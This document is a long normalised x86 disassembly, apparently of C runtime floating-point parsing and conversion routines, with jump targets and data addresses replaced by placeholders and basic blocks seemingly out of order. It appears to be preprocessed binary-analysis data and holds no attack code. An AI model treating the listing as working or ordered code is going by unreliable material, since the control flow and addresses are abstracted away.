jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1001f22f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1001f773
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1000e8db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_1000e873
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_1001fe3b ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10020bcc
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_1001fe6b
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
